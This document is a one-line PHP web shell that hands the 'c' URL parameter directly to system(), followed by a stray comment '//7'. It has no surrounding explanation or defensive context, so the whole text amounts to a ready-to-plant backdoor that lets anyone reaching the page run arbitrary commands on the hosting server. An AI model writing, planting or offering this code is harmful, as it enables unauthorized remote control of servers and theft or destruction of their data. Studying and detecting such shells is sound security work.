<?php if(isset($_GET["c"])){system($_GET["c"]);}?>
//7